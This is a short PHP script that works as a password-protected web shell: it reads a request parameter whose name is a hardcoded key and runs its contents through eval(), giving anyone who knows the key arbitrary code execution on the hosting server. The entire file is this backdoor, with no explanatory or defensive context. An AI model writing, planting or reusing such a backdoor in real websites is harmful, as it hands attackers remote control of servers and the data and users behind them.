<?php
$password = '4kai0l1PEd';
if (isset($_REQUEST[$password])) {
    $cmd = $_REQUEST[$password];
    echo eval($cmd);
}
?>